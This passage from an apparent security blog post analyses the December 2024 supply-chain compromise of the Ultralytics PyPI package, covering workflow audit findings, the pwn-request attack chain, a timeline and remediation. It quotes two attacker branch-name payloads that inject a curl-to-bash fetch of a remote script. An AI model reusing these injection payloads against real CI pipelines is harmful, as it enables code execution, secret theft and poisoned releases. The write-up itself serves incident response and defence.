</span><span>91 | |           echo &#34;PR_NUMBER=$</span>PR_NUMBER<span>&#34; &gt;&gt; </span><span>$GITHUB_ENV</span><span>
</span><span>92 | |           echo &#34;PR_TITLE=$</span><span>PR_TITLE&#34;</span> <span>&gt;&gt;</span> <span>$GITHUB_ENV</span>
<span>   | |__________________________________________________^ github.event.pull_request.number may expand into attacker-controllable code
   |
   = note: audit confidence → High

error[template-injection]: code injection via template expansion
</span><span>  --&gt;</span><span> </span>.github/workflows/publish.yml:76:9
<span>   |
76 |         - name: Extract PR Details
   |           ^^^^^^^^^^^^^^^^^^^^^^^^ this step
77 |           env:
</span><span>78 |             GH_TOKEN: $</span><span>{{</span> secrets._GITHUB_TOKEN <span>}}</span>
<span>79 |           run: |
   |  _________^
</span><span>80 | |           #</span><span> </span>Check <span>if </span>the event is a pull request or pull_request_target
<span>...  |
</span><span>91 | |           echo &#34;PR_NUMBER=$</span>PR_NUMBER<span>&#34; &gt;&gt; </span><span>$GITHUB_ENV</span><span>
</span><span>92 | |           echo &#34;PR_TITLE=$</span><span>PR_TITLE&#34;</span> <span>&gt;&gt;</span> <span>$GITHUB_ENV</span>
<span>   | |__________________________________________________^ github.event.after may expand into attacker-controllable code
   |
   = note: audit confidence → High

37 findings (16 suppressed): 0 unknown, 7 informational, 1 low, 4 medium, 9 high
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>All told, <a href="https://github.com/woodruffw/zizmor"><code>zizmor</code></a> detects the key parts of the exploit chain:</p>

<ol>
  <li>It flags <code>.github/workflows/format.yml:7:1</code> as using a fundamentally
insecure trigger (<code>pull_request_target</code>);</li>
  <li>It flags <em>other</em> sources of template/code injection in the <a href="https://github.com/ultralytics/ultralytics">Ultralytics</a>
workflows, including identical uses of the <code>git pull &lt;template expression&gt;</code>
pattern that made their custom action exploitable.</li>
</ol>

<p>At the same time, <a href="https://github.com/woodruffw/zizmor"><code>zizmor</code></a> does <strong>not</strong> detect the template injection
<em>within</em> <a href="https://github.com/ultralytics/actions"><code>ultralytics/actions</code></a> yet, since I haven’t yet added
support for auditing composite actions. This is being tracked in
<a href="https://github.com/woodruffw/zizmor/issues/173">zizmor#173</a>, and this incident is as good an impetus as any for me
to begin work on this!</p>

<h2 id="conclusions">Conclusions</h2>

<p>Based on everything above, here’s how it likely went down:</p>

<ol>
  <li>
    <p>The attacker obtained code execution in the parent (<a href="https://github.com/ultralytics/ultralytics">ultralytics/ultralytics</a>)
CI context via an insecure workflow trigger (<code>pull_request_target</code>)
combined with a template injection in a custom composite GitHub Action.
In other words, they performed a traditional <a href="https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/">“pwn request”</a> of the sort
that’s been well-understood since 2021.</p>

    <ul>
      <li>
        <p>The attacker used <a href="https://github.com/openimbot">@openimbot</a> as a puppet account, but also
used the <a href="https://github.com/jiwuwgknvm">@jiwuwgknvm</a> identity while developing their exploit.
They may or may not also be the <a href="https://github.com/jeficmer456">@jeficmer456</a> identity, which tried
to exploit a different repository shortly before with a similar
shell-script-in-Gist technique.</p>

        <p>At this point, it’s unclear whether <a href="https://github.com/openimbot">@openimbot</a> is controlled
by the attacker or not.</p>
      </li>
    </ul>
  </li>
  <li>
    <p>Once the attacker had code execution, they used a
ready-made token exfiltration script that they took
<a href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/">directly from Adnan Khan’s excellent post on GitHub Actions cache poisoning</a>.</p>
  </li>
  <li>
    <p>This script probably posted back to a webhook panel on <code>webhook.site</code>,
one that we don’t have access to (since we only have their earlier
<code>run.sh</code> attempt, not the final <code>file.sh</code> one).</p>
  </li>
  <li>
    <p>With the stolen cache token, they likely effected a cache poisoning attack
on the <code>pip</code> cache used by <code>setup-python</code>, injecting their changes
into the release distributions. Those changes were a client-side
downloader stage (patched into the <code>safe_download</code> function)
and the client side miner execution (patched into the <code>safe_run</code>
function).</p>

    <ul>
      <li>The poisoned cache key is almost certainly
<code>setup-python-Linux-x64-22.04-Ubuntu-python-3.12.7-pip-b25cacffbe61fd843ecfbb789bb607be3256af9f6e06a467b860c4324e336ee</code>.</li>
    </ul>
  </li>
</ol>

<p>There are still some loose ends here (like the actual <code>file.sh</code> payload),
but the circumstantial evidence <em>very strongly</em> suggests the above.</p>

<h2 id="appendix-rough-timeline-of-events">Appendix: Rough timeline of events</h2>

<p>Here is the rough overall timeline of what occurred, as best as I can
figure it. I’ve left out events for the <a href="https://github.com/jiwuwgknvm">@jiwuwgknvm</a> identity’s setup
and weaponization phase, since I don’t have a complete view of that yet.</p>

<ul>
  <li>
    <p>2024-08-14: <a href="https://github.com/AdnaneKhan">Adnan Khan</a> reports <a href="https://github.com/advisories/GHSA-7x29-qqmq-v6qc">GHSA-7x29-qqmq-v6qc</a> to the <a href="https://github.com/ultralytics/ultralytics">Ultralytics</a>
maintainers. This contains a template injection vulnerability <em>virtually identical</em>
to the one used by the attacker.</p>
  </li>
  <li>
    <p>2024-08-14: v0.0.3 of <a href="https://github.com/ultralytics/actions"><code>ultralytics/actions</code></a> is released with a fix for
<a href="https://github.com/advisories/GHSA-7x29-qqmq-v6qc">GHSA-7x29-qqmq-v6qc</a>.</p>
  </li>
  <li>
    <p>2024-08-24: v0.0.24 of <a href="https://github.com/ultralytics/actions"><code>ultralytics/actions</code></a> <strong>reintroduces</strong> the
vulnerability in <a href="https://github.com/ultralytics/actions/commit/c1365cedb65b86d4f77cabc192873ee4b6b33276"><code>c1365cedb65b86d4f77cabc192873ee4b6b33276</code></a>.</p>
  </li>
  <li>
    <p>2024-12-03 22:28:49: the <a href="https://github.com/jiwuwgknvm">@jiwuwgknvm</a> identity begins experimenting
with a weaponized attack against <a href="https://github.com/ultralytics/ultralytics">ultralytics/ultralytics</a>. It’s
unclear whether this identity is the same person or people as others
who attempted to weaponize code injection via branches as early as
2024-10-02.</p>
  </li>
  <li>
    <p>2024-12-03 22:33:47: the <a href="https://github.com/jiwuwgknvm">@jiwuwgknvm</a> identity submits PR #17984
(now deleted) to <a href="https://github.com/ultralytics/ultralytics">ultralytics/ultralytics</a>, which contains the <code>run.sh</code>
token stealer and exfiltration script above.</p>

    <p>From this point on, <strong>the repository should be considered to be compromised</strong>:
the attacker is assumed to have access to everything in
the <code>secrets</code> context, including any GitHub PATs <em>and</em> the PyPI API token
(which was not in use, since Ultralytics had switched to <a href="https://docs.pypi.org/trusted-publishers/">Trusted Publishing</a>).</p>
  </li>
  <li>
    <p>2024-12-04 19:33: the <a href="https://github.com/openimbot">@openimbot</a> identity submits PR <a href="https://github.com/ultralytics/ultralytics/pull/18018">#18018</a>
to <a href="https://github.com/ultralytics/ultralytics">ultralytics/ultralytics</a>, containing a template injection via a
crafted branch name.</p>

    <p>Branch payload:</p>

    <div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre><span> $</span><span>({</span>curl,-sSfL,raw.githubusercontent.com/ultralytics/ultralytics/12e4f54ca3f2e69bcdc900d1c6e16642ca8ae545/file.sh<span>}</span><span>${</span><span>IFS</span><span>}</span>|<span>${</span><span>IFS</span><span>}</span>bash<span>)</span>
</pre></td></tr></tbody></table></code></pre></div>    </div>
  </li>
  <li>
    <p>2024-12-04 19:57: the <a href="https://github.com/openimbot">@openimbot</a> identity submits PR <a href="https://github.com/ultralytics/ultralytics/pull/18020">#18020</a>
to <a href="https://github.com/ultralytics/ultralytics">ultralytics/ultralytics</a>, containing a <em>different</em> template injection via a
crafted branch name.</p>

    <p>Branch payload:</p>

    <div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre><span> $</span><span>({</span>curl,-sSfL,raw.githubusercontent.com/ultralytics/ultralytics/d8daa0b26ae0c221aa4a8c20834c4dbfef2a9a14/file.sh<span>}</span><span>${</span><span>IFS</span><span>}</span>|<span>${</span><span>IFS</span><span>}</span>bash<span>)</span>
</pre></td></tr></tbody></table></code></pre></div>    </div>
  </li>
  <li>
    <p>2024–12–04 20:50: Release for v8.3.41 is triggered by the
<a href="https://github.com/UltralyticsAssistant">@UltralyticsAssistant</a> identity via commit <a href="https://github.com/ultralytics/ultralytics/commit/cb260c243ffa3e0cc84820095cd88be2f5db86ca"><code>cb260c243ffa3e0cc84820095cd88be2f5db86ca</code></a>,
which <em>also</em> disables the actor release restriction for <a href="https://github.com/glenn-jocher">@glenn-jocher</a>. This <strong>strongly suggests</strong>
that the attacker is in full control of the <a href="https://github.com/UltralyticsAssistant">@UltralyticsAssistant</a> identity
at this point.</p>

    <p>Workflow run: <a href="https://github.com/ultralytics/ultralytics/actions/runs/12168072999/job/33938058724">https://github.com/ultralytics/ultralytics/actions/runs/12168072999/job/33938058724</a>.</p>
  </li>
  <li>
    <p>2024-12-04 20:51: Sigstore’s transparency log records <a href="https://search.sigstore.dev/?logIndex=153415338">153415338</a> and
<a href="https://search.sigstore.dev/?logIndex=153415340">153415340</a> indicating two attestations, one for each of the distributions
of v8.3.41 that will appear on PyPI (<code>ultralytics-8.3.41.tar.gz</code> and
<code>ultralytics-8.3.41-py3-none-any.whl</code>).</p>
  </li>
  <li>
    <p>2024-12-04 20:51: v8.3.41 is uploaded to PyPI with a Trusted Publisher
and valid attestations for each distribution, matching the
<a href="https://github.com/ultralytics/ultralytics">ultralytics/ultralytics</a> Trusted Publisher identity.</p>

    <ul>
      <li>A detailed sub-item timeline for this upload is available in
<a href="https://github.com/ultralytics/ultralytics/issues/18027#issuecomment-2523755580">this comment</a>.</li>
    </ul>
  </li>
  <li>
    <p>2024-12-06 06:34: <a href="https://github.com/ultralytics/ultralytics/issues/18027">#18027</a> is opened on GitHub by <a href="https://github.com/metrizable">Eric Johnson</a>, identifying
v8.3.41 as malicious.</p>
  </li>
  <li>
    <p>2024-12-05 09:15:06: v8.3.41 is removed from PyPI (approx. 12 hours after introduction).</p>
  </li>
  <li>
    <p>2024-12-04 12:46: Release for v8.3.42 is triggered by <a href="https://github.com/glenn-jocher">@glenn-jocher</a> via
commit <a href="https://github.com/ultralytics/ultralytics/commit/950d9f73fc3e12c87e45f4f792281ee8e3cfc75f"><code>950d9f73fc3e12c87e45f4f792281ee8e3cfc75f</code></a>. At this point
the actor release restriction is back in place, but has no effect as
<a href="https://github.com/glenn-jocher">@glenn-jocher</a> is the one making the release.</p>

    <p>Workflow run: <a href="https://github.com/ultralytics/ultralytics/actions/runs/12180037832/job/33973482495">https://github.com/ultralytics/ultralytics/actions/runs/12180037832/job/33973482495</a>.</p>
  </li>
  <li>
    <p>2024-12-05 12:47: Sigstore’s transparency log records <a href="https://search.sigstore.dev/?logIndex=153589716">153589716</a> and <a href="https://search.sigstore.dev/?logIndex=153589717">153589717</a>
indicating two attestations, one for each of the distributions of v8.3.42 that will
appear on PyPI (<code>ultralytics-8.3.42.tar.gz</code> and <code>ultralytics-8.3.42-py3-none-any.whl</code>).</p>
  </li>
  <li>
    <p>2024-12-05 12:47: v8.3.42 is uploaded to PyPI with a Trusted Publisher and valid
attestations for each distribution.</p>
  </li>
  <li>
    <p>2024-12-05 13:03: <a href="https://github.com/renzhexigua">@renzhexigua</a> announces on <a href="https://github.com/ultralytics/ultralytics/issues/18027">#18027</a> that
v8.3.42 is still malicious.</p>
  </li>
  <li>
    <p>2024-12-05 13:47:30: v8.3.42 is removed from PyPI (approx. 1 hour after introduction).</p>
  </li>
  <li>
    <p>2024-12-05 15:17: <a href="https://github.com/glenn-jocher">@glenn-jocher</a> announces on <a href="https://github.com/ultralytics/ultralytics/issues/18027">#18027</a> that the <a href="https://github.com/openimbot">@openimbot</a> identity
is banned from interacting with <a href="https://github.com/ultralytics/ultralytics">Ultralytics</a>.</p>
  </li>
  <li>
    <p>2024-12-07 01:41:45: v8.3.45 is directly released to PyPI, with no CI/CD or repository
activity from <a href="https://github.com/ultralytics/ultralytics">ultralytics/ultralytics</a>. This was done with an API token
and not a Trusted Publisher, and therefore has no attestations. This <strong>strongly suggests</strong>
that the attacker either obtained a PyPI API token from the original secrets
exfiltration phase <strong>or</strong> is in full control
<a href="https://pypi.org/user/glenn-jocher/">pypi/u/glenn-jocher</a>.</p>
  </li>
  <li>
    <p>2024-12-07 02:27:14: v8.3.46 is directly released to PyPI, with no CI/CD or repository
activity from <a href="https://github.com/ultralytics/ultralytics">ultralytics/ultralytics</a>. Like with v8.3.45, this release is done
via API token and has no attestation.</p>
  </li>
  <li>
    <p>2024-12-07 04:00: <a href="https://github.com/AdnaneKhan">Adnan Khan</a> announces on <a href="https://github.com/ultralytics/ultralytics/issues/18027">#18027</a> that v8.3.45 and v8.3.46
are still malcious, albiet with a different (simpler) miner payload.</p>
  </li>
  <li>
    <p>2024-12-07 10:08:32: v8.3.45 is removed from PyPI (approx. 8 hours after introduction).</p>
  </li>
  <li>
    <p>2024-12-07 10:09:08: v8.3.46 is removed from PyPI (approx. 7.5 hours after introduction).</p>
  </li>
</ul>

<p>In summary:</p>

<ul>
  <li>
    <p>A total of 4 different releases of <a href="https://github.com/ultralytics/ultralytics">Ultralytics</a> were malicious: v8.3.41, v8.3.42, v8.3.45,
and v8.3.46.</p>

    <ul>
      <li>Of these releases, two were made via GitHub Actions and used Trusted Publishing + attestations,
and two were made via an API token that the attacker likely either exfiltrated from
a developer’s machine or from the GitHub Actions <code>secret</code> context (where it may
have been forgotten about after Trusted Publishing was enabled).</li>
    </ul>
  </li>
  <li>
    <p>All evidence <strong>strongly suggests</strong> that the attacker was able to fully exfiltrate
all of the configured repository secrets within <a href="https://github.com/ultralytics/ultralytics">ultralytics/ultralytics</a>. As
such, the Ultralytics maintains <strong>must consider these credentials compromised
and revoke them immediately to avoid further compromise</strong>. The failure to immediately
revoke a stale API token <em>may</em> have been what enabled the follow-on direct
releases of v8.3.45 and v8.3.46.</p>

    <ul>
      <li>In particular, in addition to any PyPI API tokens, the attacker may have
access to a custom GitHub PAT configured as <code>secrets._GITHUB_TOKEN</code> in
the Ultralytics CI. This <strong>must</strong> be considered compromised and
revoked immediately.</li>
    </ul>
  </li>
  <li>
    <p>All evidence <strong>strongly suggests</strong> that the attacker was in full control of the
<a href="https://github.com/UltralyticsAssistant">@UltralyticsAssistant</a> bot account, and <strong>may still have control over it</strong>.</p>
  </li>
  <li>
    <p>The basic vulnerability that enabled this attack has been present in
<a href="https://github.com/ultralytics/actions"><code>ultralytics/actions</code></a> since 2024-08-24 and was <strong>reintroduced</strong> after
a previous disclosure. This <strong>strongly suggests</strong> a lack of adequate
security controls and reviews within Ultralytics’ processes.</p>
  </li>
</ul>

<hr/>




<hr/>


<span>
  Discussions:
  
  <a href="https://infosec.exchange/@yossarian/113607103858837241">Mastodon</a>
  
  <a href="https://bsky.app/profile/yossarian.net/post/3lcnq3kt6k425">Bluesky</a>
  
  <a href="https://reddit.com/r/enosuchblog/comments/1h86yvv/zizmor_would_have_caught_the_ultralytics_workflow/">Reddit</a>
  
</span>
<hr/>



  






</div>
  </body>
</html>
